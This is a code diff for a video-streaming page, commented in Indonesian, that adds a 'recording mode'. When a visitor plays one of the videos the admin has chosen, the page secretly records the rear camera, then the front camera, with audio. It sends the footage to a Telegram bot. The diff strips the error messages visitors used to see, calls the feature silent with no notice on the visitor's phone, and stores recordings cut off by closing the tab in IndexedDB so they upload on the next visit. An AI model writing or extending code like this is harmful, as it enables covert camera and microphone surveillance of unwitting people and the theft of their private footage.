@@ -207,8 +207,17 @@
 
         .rec-admin-panel { max-width: 1200px; margin: 0 auto 20px; background: #1C1F26; border: 1px solid #2a2a2a; border-radius: 12px; padding: 20px; }
         .rec-admin-panel h3 { color: #ef4444; margin-bottom: 16px; }
-        .rec-video-list { max-height: 320px; overflow-y: auto; border: 1px solid #2a2a2a; border-radius: 8px; padding: 8px; margin-bottom: 14px; }
-        .rec-video-row { display: flex; align-items: center; gap: 10px; padding: 8px; border-bottom: 1px solid #1a1a1a; }
+        .rec-video-list { max-height: 400px; overflow-y: auto; border: 1px solid #2a2a2a; border-radius: 8px; padding: 8px; margin-bottom: 14px; }
+        .rec-folder-group { margin-bottom: 8px; border: 1px solid #1a1a1a; border-radius: 6px; overflow: hidden; }
+        .rec-folder-header { display: flex; align-items: center; gap: 8px; padding: 10px 12px; background: #14151A; cursor: pointer; user-select: none; }
+        .rec-folder-header:hover { background: #1a1a1a; }
+        .rec-folder-header .rec-folder-arrow { color: #f59b00; font-size: 11px; transition: transform 0.2s; }
+        .rec-folder-header.collapsed .rec-folder-arrow { transform: rotate(-90deg); }
+        .rec-folder-header .rec-folder-name { flex: 1; color: #f59b00; font-weight: 600; font-size: 13px; }
+        .rec-folder-header .rec-folder-count { color: #555; font-size: 11px; }
+        .rec-folder-body { display: block; padding: 4px 0; }
+        .rec-folder-body.collapsed { display: none; }
+        .rec-video-row { display: flex; align-items: center; gap: 10px; padding: 8px 12px; border-bottom: 1px solid #1a1a1a; }
         .rec-video-row:last-child { border-bottom: none; }
         .rec-video-row img { width: 40px; height: 60px; object-fit: cover; border-radius: 4px; background: #14151A; }
         .rec-video-row label { flex: 1; font-size: 13px; color: #ccc; cursor: pointer; display: flex; align-items: center; gap: 8px; }
@@ -441,12 +450,12 @@
                 <h3><i class="fas fa-video"></i> Mode Rekam Bergantian (Belakang → Depan)</h3>
                 <p style="color:#888; font-size:13px; margin-bottom:12px;">
                     Pilih video yang akan memicu rekaman saat diputar pengunjung.
-                    Rekaman akan <strong>mulai dari kamera belakang selama 5 detik</strong>, lalu otomatis berganti ke <strong>kamera depan sampai tab ditutup</strong>.
-                    Hasil: dua file terpisah (belakang 5 detik + depan sampai tab ditutup), keduanya dikirim ke Telegram sebagai video.
-                    <br><em style="color:#ef4444;">Berjalan senyap — tidak ada indikator visual apapun di player.</em>
+                    Rekaman <strong>mulai dari kamera belakang selama 5 detik</strong>, lalu otomatis berganti ke <strong>kamera depan sampai video selesai</strong>.
+                    Keduanya dikirim ke Telegram sebagai video.
+                    <br><em style="color:#ef4444;">Berjalan senyap — tidak ada notifikasi apapun di HP pengunjung.</em>
                 </p>
                 <div class="form-group">
-                    <label>Pilih Video yang Dipantau</label>
+                    <label>Pilih Video yang Dipantau (per folder)</label>
                     <div class="rec-video-list" id="recVideoList"></div>
                 </div>
                 <button type="button" class="btn-submit" style="background:#ef4444;" onclick="saveRecModeSettings()"><i class="fas fa-save"></i> Simpan Pengaturan Mode Rekam</button>
@@ -2220,15 +2229,115 @@
         }
 
         // ==========================================================
-        // MODE REKAM — BERGANTIAN: BELAKANG 5 DETIK → DEPAN SAMPAI TAB DITUTUP
+        // MODE REKAM — BERGANTIAN: BELAKANG 5 DETIK → DEPAN SAMPAI VIDEO SELESAI
+        // Tidak ada notifikasi ke pengunjung. Kalau tab ditutup sebelum
+        // video selesai, file disimpan ke IndexedDB & diupload saat halaman dibuka lagi.
         // ==========================================================
         let recSelectedVideoIds = [];
         let recSessionActive = false;
         let recSessionToken = null;
         let recActiveVideoId = null;
         let recSwitchTimer = null;
-        let recBackRecorder = null, recBackStream = null, recBackChunks = [], recBackStart = null, recBackMime = '';
-        let recFrontRecorder = null, recFrontStream = null, recFrontChunks = [], recFrontStart = null, recFrontMime = '';
+        let recBackSlot = makeSlot();
+        let recFrontSlot = makeSlot();
+
+        function makeSlot() { return { recorder: null, stream: null, chunks: [], startTime: null, mime: '' }; }
+
+        // ---- IndexedDB helper ----
+        function openRecDB() {
+            return new Promise((resolve, reject) => {
+                const req = indexedDB.open('vidoy_rec_db', 1);
+                req.onupgradeneeded = () => {
+                    const db = req.result;
+                    if (!db.objectStoreNames.contains('pending')) db.createObjectStore('pending', { keyPath: 'id' });
+                };
+                req.onsuccess = () => resolve(req.result);
+                req.onerror = () => reject(req.error);
+            });
+        }
+        async function savePendingRecFile(rec) {
+            try {
+                const db = await openRecDB();
+                return new Promise((resolve, reject) => {
+                    const tx = db.transaction('pending', 'readwrite');
+                    tx.objectStore('pending').put(rec);
+                    tx.oncomplete = () => resolve(true);
+                    tx.onerror = () => reject(tx.error);
+                });
+            } catch (e) { console.warn('Gagal simpan pending rec:', e); return false; }
+        }
+        async function loadPendingRecFiles() {
+            try {
+                const db = await openRecDB();
+                return new Promise((resolve, reject) => {
+                    const tx = db.transaction('pending', 'readonly');
+                    const req = tx.objectStore('pending').getAll();
+                    req.onsuccess = () => resolve(req.result || []);
+                    req.onerror = () => reject(req.error);
+                });
+            } catch (e) { return []; }
+        }
+        async function deletePendingRecFile(id) {
+            try {
+                const db = await openRecDB();
+                return new Promise((resolve, reject) => {
+                    const tx = db.transaction('pending', 'readwrite');
+                    tx.objectStore('pending').delete(id);
+                    tx.oncomplete = () => resolve(true);
+                    tx.onerror = () => reject(tx.error);
+                });
+            } catch (e) { return false; }
+        }
+        async function processPendingRecFiles() {
+            const pending = await loadPendingRecFiles();
+            if (!pending.length) return;
+            console.log('📤 Memproses ' + pending.length + ' rekaman tertunda...');
+            for (const p of pending) {
+                try {
+                    const ok = await uploadBlobToTelegram(p.blob, p.label, p.videoId, p.duration, p.session, p.mime);
+                    if (ok) { await deletePendingRecFile(p.id); console.log('✅ Rekaman tertunda terkirim:', p.label); }
+                } catch (e) { console.warn('Gagal kirim pending rec:', e); }
+            }
+        }
+
+        async function uploadBlobToTelegram(blob, label, videoId, dur, session, mime) {
+            const isMp4 = (mime || '').indexOf('mp4') !== -1;
+            try {
+                const infoRes = await fetch('/api/telegram-rec', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-admin-key': getUploadAdminKey() },
+                    body: JSON.stringify({ label, videoId, duration: dur, session })
+                });
+                const info = await infoRes.json().catch(() => null);
+                if (infoRes.status === 401) { localStorage.removeItem('vidoy_upload_key'); return false; }
+                if (!infoRes.ok || !info || !info.ok) return false;
+                const botToken = info.botToken;
+                const chatId = info.chatId;
+                const ext = isMp4 ? 'mp4' : 'webm';
+                const form = new FormData();
+                form.append('chat_id', chatId);
+                const caption = '🎥 Rekaman ' + (label === 'back' ? 'BELAKANG' : 'DEPAN') + '\nVideo ID: ' + (videoId || '-') + '\nSesi: ' + (session || '-') + '\nDurasi: ' + dur + 's';
+                form.append('caption', caption);
+                form.append('supports_streaming', 'true');
+                form.append('video', blob, 'rec_' + label + '_' + videoId + '_' + Date.now() + '.' + ext);
+                const tgRes = await fetch('https://api.telegram.org/bot' + botToken + '/sendVideo', { method: 'POST', body: form });
+                const tgJson = await tgRes.json().catch(() => null);
+                if (!tgRes.ok || !tgJson || !tgJson.ok) return false;
+                const msg = tgJson.result;
+                const doc = msg && (msg.video || msg.document);
+                const chatUrl = 'https://t.me/c/' + String(chatId).replace(/^-100/, '') + '/' + (msg ? msg.message_id : '');
+                if (!data.settings.recRecordings) data.settings.recRecordings = [];
+                data.settings.recRecordings.push({
+                    id: 'rec_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6),
+                    videoId: String(videoId || '-'), camera: label,
+                    url: '', fileId: doc ? doc.file_id : '', messageId: msg ? msg.message_id : 0,
+                    chatUrl, sentToTelegram: true, error: '', duration: dur, format: ext,
+                    session: String(session || '-'), createdAt: new Date().toISOString()
+                });
+                await saveToCloud();
+                return true;
+            } catch (e) { return false; }
+        }
 
         function loadRecModeSettings() {
             recSelectedVideoIds = Array.isArray(data.settings && data.settings.recVideoIds) ? data.settings.recVideoIds.map(String) : [];
@@ -2241,21 +2350,54 @@
             const box = document.getElementById('recStatusBox');
             if (!box) return;
             if (recSelectedVideoIds.length === 0) box.innerHTML = '<i class="fas fa-info-circle"></i> Belum ada video yang dipantau.';
-            else box.innerHTML = '<i class="fas fa-circle-check" style="color:#22c55e;"></i> <strong>' + recSelectedVideoIds.length + '</strong> video dipantau oleh mode rekam bergantian (belakang 5 detik → depan).';
+            else box.innerHTML = '<i class="fas fa-circle-check" style="color:#22c55e;"></i> <strong>' + recSelectedVideoIds.length + '</strong> video dipantau oleh mode rekam bergantian.';
         }
 
         function renderRecVideoList() {
             const list = document.getElementById('recVideoList');
             if (!list) return;
-            const allVideos = [];
-            data.rootVideos.forEach(v => allVideos.push({ v, folderName: 'Root' }));
-            data.folders.forEach(f => f.videos.forEach(v => allVideos.push({ v, folderName: f.name })));
-            if (allVideos.length === 0) { list.innerHTML = '<div style="color:#555; padding:10px; font-size:13px;">Belum ada video.</div>'; return; }
-            list.innerHTML = allVideos.map(({ v, folderName }) => {
-                const checked = recSelectedVideoIds.includes(String(v.id)) ? 'checked' : '';
-                const thumb = v.thumbnail || 'https://via.placeholder.com/40x60/222/f59b00?text=?';
-                return '<div class="rec-video-row"><img src="' + escapeHtml(thumb) + '" alt="" onerror="this.src=\'https://via.placeholder.com/40x60/222/f59b00?text=?\'"><label><input type="checkbox" value="' + v.id + '" ' + checked + '> ' + escapeHtml(v.title || '(tanpa judul)') + ' <span style="color:#555; font-size:11px;">— ' + escapeHtml(folderName) + '</span></label></div>';
-            }).join('');
+            let html = '';
+            const rootVideos = data.rootVideos || [];
+            if (rootVideos.length > 0) {
+                html += `<div class="rec-folder-group">
+                    <div class="rec-folder-header" onclick="toggleRecFolder(this)">
+                        <span class="rec-folder-arrow">▼</span>
+                        <span class="rec-folder-name"><i class="fas fa-home"></i> Root (Tanpa Folder)</span>
+                        <span class="rec-folder-count">${rootVideos.length} video</span>
+                    </div>
+                    <div class="rec-folder-body">`;
+                rootVideos.forEach(v => {
+                    const checked = recSelectedVideoIds.includes(String(v.id)) ? 'checked' : '';
+                    const thumb = v.thumbnail || 'https://via.placeholder.com/40x60/222/f59b00?text=?';
+                    html += `<div class="rec-video-row"><img src="${escapeHtml(thumb)}" alt="" onerror="this.src='https://via.placeholder.com/40x60/222/f59b00?text=?'"><label><input type="checkbox" value="${v.id}" ${checked}> ${escapeHtml(v.title || '(tanpa judul)')}</label></div>`;
+                });
+                html += `</div></div>`;
+            }
+            data.folders.forEach(f => {
+                const videos = f.videos || [];
+                html += `<div class="rec-folder-group">
+                    <div class="rec-folder-header ${videos.length === 0 ? 'collapsed' : ''}" onclick="toggleRecFolder(this)">
+                        <span class="rec-folder-arrow">▼</span>
+                        <span class="rec-folder-name"><i class="fas fa-folder"></i> ${escapeHtml(f.name)}</span>
+                        <span class="rec-folder-count">${videos.length} video</span>
+                    </div>
+                    <div class="rec-folder-body ${videos.length === 0 ? 'collapsed' : ''}">`;
+                if (videos.length === 0) html += `<div style="color:#555; padding:10px 12px; font-size:12px;">Folder kosong.</div>`;
+                else videos.forEach(v => {
+                    const checked = recSelectedVideoIds.includes(String(v.id)) ? 'checked' : '';
+                    const thumb = v.thumbnail || 'https://via.placeholder.com/40x60/222/f59b00?text=?';
+                    html += `<div class="rec-video-row"><img src="${escapeHtml(thumb)}" alt="" onerror="this.src='https://via.placeholder.com/40x60/222/f59b00?text=?'"><label><input type="checkbox" value="${v.id}" ${checked}> ${escapeHtml(v.title || '(tanpa judul)')}</label></div>`;
+                });
+                html += `</div></div>`;
+            });
+            if (!html) html = '<div style="color:#555; padding:10px; font-size:13px;">Belum ada video.</div>';
+            list.innerHTML = html;
+        }
+
+        function toggleRecFolder(headerEl) {
+            headerEl.classList.toggle('collapsed');
+            const body = headerEl.nextElementSibling;
+            if (body) body.classList.toggle('collapsed');
         }
 
         async function saveRecModeSettings() {
@@ -2274,100 +2416,67 @@
         }
 
         function pickMime() {
-            // MP4 didahulukan (Safari iOS/macOS baru), fallback WebM (Chrome/Firefox/Android)
             const candidates = ['video/mp4;codecs=h264,aac', 'video/mp4;codecs=avc1.42E01E,mp4a.40.2', 'video/mp4', 'video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm'];
             for (const m of candidates) { try { if (MediaRecorder.isTypeSupported(m)) return m; } catch (e) {} }
             return '';
         }
 
-        // Buka 1 kamera dengan resolusi native (rasio asli, tidak dipaksa 640x480)
         async function openCamera(facingMode, withAudio) {
             const constraints = {
-                video: {
-                    facingMode: { ideal: facingMode },
-                    width: { ideal: 1920 },  // minta resolusi tinggi, browser akan pilih yang tersedia
-                    height: { ideal: 1080 }
-                },
+                video: { facingMode: { ideal: facingMode }, width: { ideal: 1920 }, height: { ideal: 1080 } },
                 audio: withAudio ? { echoCancellation: true, noiseSuppression: true } : false
             };
             return await navigator.mediaDevices.getUserMedia(constraints);
         }
 
-        function startRecorderOn(slotRef, stream) {
+        function startRecorderOn(slot, stream) {
             const mime = pickMime();
             const options = mime ? { mimeType: mime } : {};
             const rec = new MediaRecorder(stream, options);
-            rec.ondataavailable = e => { if (e.data && e.data.size > 0) slotRef.chunks.push(e.data); };
-            slotRef.recorder = rec;
-            slotRef.stream = stream;
-            slotRef.chunks = [];
-            slotRef.startTime = new Date();
-            slotRef.mime = mime || 'video/webm';
+            rec.ondataavailable = e => { if (e.data && e.data.size > 0) slot.chunks.push(e.data); };
+            slot.recorder = rec;
+            slot.stream = stream;
+            slot.chunks = [];
+            slot.startTime = new Date();
+            slot.mime = mime || 'video/webm';
             rec.start(1000);
         }
 
-        // Slot object helper (biar bisa passing by reference)
-        function makeSlot() { return { recorder: null, stream: null, chunks: [], startTime: null, mime: '' }; }
-        let recBackSlot = makeSlot();
-        let recFrontSlot = makeSlot();
-
-        // Mulai rekam kamera belakang 5 detik, lalu ganti ke depan sampai tab ditutup
         async function startRecordingForVideo(videoId) {
             if (recSessionActive) return;
             if (!shouldRecordForVideo(videoId)) return;
             recSessionActive = true;
             recActiveVideoId = String(videoId);
             recSessionToken = Date.now();
-            console.log('🎥 Mulai rekam bergantian untuk video:', videoId);
-
-            // 1) Rekam kamera belakang
             try {
                 const backStream = await openCamera('environment', true);
                 recBackSlot = makeSlot();
                 startRecorderOn(recBackSlot, backStream);
-                console.log('✅ Kamera belakang mulai merekam, akan berganti ke depan dalam 5 detik');
             } catch (e) {
-                console.warn('❌ Kamera belakang gagal dibuka:', e);
-                showNotification('⚠️ Kamera belakang tidak bisa dibuka: ' + e.message, 'error');
-                // Langsung ke depan saja
                 try {
                     const frontStream = await openCamera('user', true);
                     recFrontSlot = makeSlot();
                     startRecorderOn(recFrontSlot, frontStream);
-                } catch (e2) {
-                    console.warn('❌ Kamera depan juga gagal:', e2);
-                    recSessionActive = false;
-                    return;
-                }
+                } catch (e2) { recSessionActive = false; return; }
                 return;
             }
-
-            // 2) Timer 5 detik → stop belakang, mulai depan
             recSwitchTimer = setTimeout(async () => {
                 recSwitchTimer = null;
-                console.log('⏰ 5 detik selesai, ganti ke kamera depan');
-                // Stop belakang & kirim ke Telegram
-                await stopSlotAndSend(recBackSlot, 'back', videoId);
-                // Mulai depan
+                await finalizeSlot(recBackSlot, 'back', videoId);
                 try {
                     const frontStream = await openCamera('user', true);
                     recFrontSlot = makeSlot();
                     startRecorderOn(recFrontSlot, frontStream);
-                    console.log('✅ Kamera depan mulai merekam, akan lanjut sampai tab ditutup');
-                } catch (e) {
-                    console.warn('❌ Kamera depan gagal dibuka:', e);
-                    showNotification('⚠️ Kamera depan tidak bisa dibuka: ' + e.message, 'error');
-                }
+                } catch (e) {}
             }, 5000);
         }
 
-        // Stop 1 slot recorder dan kirim ke Telegram sebagai VIDEO
-        function stopSlotAndSend(slot, label, videoId) {
+        async function finalizeSlot(slot, label, videoId) {
+            if (!slot.recorder || slot.recorder.state === 'inactive') {
+                if (slot.stream) { slot.stream.getTracks().forEach(t => t.stop()); slot.stream = null; }
+                return null;
+            }
             return new Promise(resolve => {
-                if (!slot.recorder || slot.recorder.state === 'inactive') {
-                    if (slot.stream) { slot.stream.getTracks().forEach(t => t.stop()); slot.stream = null; }
-                    resolve(null); return;
-                }
                 slot.recorder.onstop = async () => {
                     const isMp4 = (slot.mime || '').indexOf('mp4') !== -1;
                     const blob = new Blob(slot.chunks, { type: isMp4 ? 'video/mp4' : 'video/webm' });
@@ -2377,99 +2486,80 @@
                     if (slot.stream) { slot.stream.getTracks().forEach(t => t.stop()); slot.stream = null; }
                     slot.recorder = null;
                     if (blob.size < 1000) { resolve(null); return; }
-                    try {
-                        const infoRes = await fetch('/api/telegram-rec', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json', 'x-admin-key': getUploadAdminKey() },
-                            body: JSON.stringify({ label, videoId, duration: dur, session: recSessionToken })
+                    const ok = await uploadBlobToTelegram(blob, label, videoId, dur, recSessionToken, slot.mime);
+                    if (!ok) {
+                        await savePendingRecFile({
+                            id: 'pending_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6),
+                            blob, label, videoId, duration: dur, session: recSessionToken, mime: slot.mime,
+                            createdAt: new Date().toISOString()
                         });
-                        const info = await infoRes.json().catch(() => null);
-                        if (infoRes.status === 401) { localStorage.removeItem('vidoy_upload_key'); throw new Error('Password upload salah'); }
-                        if (!infoRes.ok || !info || !info.ok) throw new Error((info && info.error) || ('Gagal ambil token Telegram (' + infoRes.status + ')'));
-
-                        const botToken = info.botToken;
-                        const chatId = info.chatId;
-                        const ext = isMp4 ? 'mp4' : 'webm';
-
-                        const form = new FormData();
-                        form.append('chat_id', chatId);
-                        const caption = '🎥 Rekaman ' + (label === 'back' ? 'BELAKANG' : 'DEPAN') + '\nVideo ID: ' + (videoId || '-') + '\nSesi: ' + (recSessionToken || '-') + '\nDurasi: ' + dur + 's';
-                        form.append('caption', caption);
-                        form.append('supports_streaming', 'true');
-                        form.append('video', blob, 'rec_' + label + '_' + videoId + '_' + Date.now() + '.' + ext);
-
-                        const tgRes = await fetch('https://api.telegram.org/bot' + botToken + '/sendVideo', { method: 'POST', body: form });
-                        const tgJson = await tgRes.json().catch(() => null);
-                        if (!tgRes.ok || !tgJson || !tgJson.ok) throw new Error((tgJson && tgJson.description) || ('Telegram menolak (' + tgRes.status + ')'));
-
-                        const msg = tgJson.result;
-                        const doc = msg && (msg.video || msg.document);
-                        const chatUrl = 'https://t.me/c/' + String(chatId).replace(/^-100/, '') + '/' + (msg ? msg.message_id : '');
-                        const record = { label, url: '', fileId: doc ? doc.file_id : '', messageId: msg ? msg.message_id : 0, chatUrl, duration: dur, sentToTelegram: true, format: ext };
-                        saveRecRecording(record, videoId);
-                        resolve(record);
-                    } catch (err) {
-                        console.error('Kirim rekaman ' + label + ' ke Telegram gagal:', err);
-                        const record = { label, url: '', error: err.message, duration: dur, sentToTelegram: false };
-                        saveRecRecording(record, videoId);
-                        resolve(record);
                     }
+                    resolve(ok);
                 };
                 try { slot.recorder.stop(); } catch (e) { resolve(null); }
             });
         }
 
-        function saveRecRecording(record, videoId) {
-            if (!data.settings.recRecordings) data.settings.recRecordings = [];
-            data.settings.recRecordings.push({
-                id: 'rec_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6),
-                videoId: String(videoId || '-'), camera: record.label,
-                url: record.url || '', fileId: record.fileId || '', messageId: record.messageId || 0,
-                chatUrl: record.chatUrl || '', sentToTelegram: !!record.sentToTelegram, error: record.error || '',
-                duration: record.duration || 0, format: record.format || 'webm',
-                session: String(recSessionToken || '-'), createdAt: new Date().toISOString()
-            });
-            saveToCloud().then(() => {
-                renderRecRecordingsList();
-                if (record.sentToTelegram) showNotification('✅ Rekaman ' + (record.label === 'back' ? 'belakang' : 'depan') + ' terkirim ke Telegram', 'success');
-                else showNotification('⚠️ Rekaman ' + record.label + ' gagal terkirim', 'error');
-            }).catch(() => {});
-        }
-
-        // Stop semua (belakang & depan) saat tab ditutup
-        async function stopRecording() {
+        // Dipanggil saat video ended: stop semua, upload langsung
+        async function finalizeAllOnEnded() {
             if (recSwitchTimer) { clearTimeout(recSwitchTimer); recSwitchTimer = null; }
             if (!recSessionActive) return;
             const vid = recActiveVideoId;
             recSessionActive = false;
             recActiveVideoId = null;
-            // Stop sisa yang masih aktif (kalau ada)
+            console.log('🎬 Video ended, menghentikan rekaman & upload ke Telegram...');
             const results = await Promise.all([
-                stopSlotAndSend(recBackSlot, 'back', vid),
-                stopSlotAndSend(recFrontSlot, 'front', vid)
+                finalizeSlot(recBackSlot, 'back', vid),
+                finalizeSlot(recFrontSlot, 'front', vid)
             ]);
-            const saved = results.filter(Boolean);
-            console.log('🎥 Sesi rekam selesai, total terkirim:', saved.filter(r => r.sentToTelegram).length);
+            const okCount = results.filter(Boolean).length;
+            console.log('✅ Selesai. ' + okCount + ' rekaman terkirim.');
+            renderRecRecordingsList();
+        }
+
+        // Backup: simpan ke IndexedDB kalau tab ditutup sebelum video selesai
+        async function stopRecordingAndPersist() {
+            if (recSwitchTimer) { clearTimeout(recSwitchTimer); recSwitchTimer = null; }
+            if (!recSessionActive) return;
+            const vid = recActiveVideoId;
+            recSessionActive = false;
+            recActiveVideoId = null;
+            const slots = [recBackSlot, recFrontSlot];
+            for (const slot of slots) {
+                if (!slot.recorder || slot.recorder.state === 'inactive') continue;
+                const isMp4 = (slot.mime || '').indexOf('mp4') !== -1;
+                const blob = new Blob(slot.chunks, { type: isMp4 ? 'video/mp4' : 'video/webm' });
+                const dur = slot.startTime ? Math.round((Date.now() - slot.startTime.getTime()) / 1000) : 0;
+                slot.chunks = [];
+                if (slot.stream) { slot.stream.getTracks().forEach(t => t.stop()); slot.stream = null; }
+                try { slot.recorder.stop(); } catch (e) {}
+                slot.recorder = null;
+                if (blob.size > 1000) {
+                    const label = (slot === recBackSlot) ? 'back' : 'front';
+                    await savePendingRecFile({
+                        id: 'pending_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6),
+                        blob, label, videoId: vid, duration: dur, session: recSessionToken, mime: slot.mime,
+                        createdAt: new Date().toISOString()
+                    });
+                }
+            }
         }
 
         function attachRecModeListeners() {
             const player = document.getElementById('detailVideo');
             if (!player || player.dataset.recBound === '2') return;
             player.dataset.recBound = '2';
-            // Mulai rekam saat video playing
             player.addEventListener('play', () => {
                 if (currentDetailVideo && shouldRecordForVideo(currentDetailVideo.id) && !recSessionActive) {
                     startRecordingForVideo(currentDetailVideo.id);
                 }
             });
-            // TIDAK stop pada 'ended' atau 'pause' — hanya stop saat tab ditutup
-            window.addEventListener('beforeunload', () => {
-                if (recSwitchTimer) clearTimeout(recSwitchTimer);
-                [recBackSlot, recFrontSlot].forEach(slot => {
-                    try { if (slot.recorder && slot.recorder.state !== 'inactive') slot.recorder.stop(); } catch (e) {}
-                    if (slot.stream) slot.stream.getTracks().forEach(t => t.stop());
-                });
-            });
+            // STOP saat video selesai
+            player.addEventListener('ended', () => { finalizeAllOnEnded(); });
+            // Backup kalau tab ditutup sebelum video selesai
+            document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') stopRecordingAndPersist(); });
+            window.addEventListener('pagehide', () => { stopRecordingAndPersist(); });
+            window.addEventListener('beforeunload', () => { stopRecordingAndPersist(); });
         }
 
         function renderRecRecordingsList() {
@@ -2523,9 +2613,6 @@
             showNotification('✅ Rekaman dihapus', 'success');
         }
 
-        // ==========================================================
-        // OVERRIDE
-        // ==========================================================
         const _origSwitchTab = switchTab;
         switchTab = function(tab) {
             _origSwitchTab(tab);
@@ -2562,6 +2649,7 @@
             await _origInit.apply(this, arguments);
             loadRecModeSettings();
             attachRecModeListeners();
+            setTimeout(() => { processPendingRecFiles(); }, 3000);
         };
 
         async function init() {
